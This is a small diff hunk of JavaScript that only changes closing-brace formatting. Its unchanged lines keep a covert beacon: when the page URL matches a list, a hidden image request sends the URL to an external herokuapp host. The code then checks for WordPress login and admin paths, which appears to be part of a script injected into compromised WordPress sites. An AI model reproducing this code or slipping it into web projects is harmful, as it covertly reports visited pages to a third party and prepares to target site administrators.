@@ -63,8 +63,8 @@ var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (location.href.indexOf(myStringArray[i]) > -1) {
       (new Image).src = "https://fetching-url.herokuapp.com/sites.php?l="+encodeURIComponent(location.href);
-      }
-    }
+    };
+  };
 
 
     if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
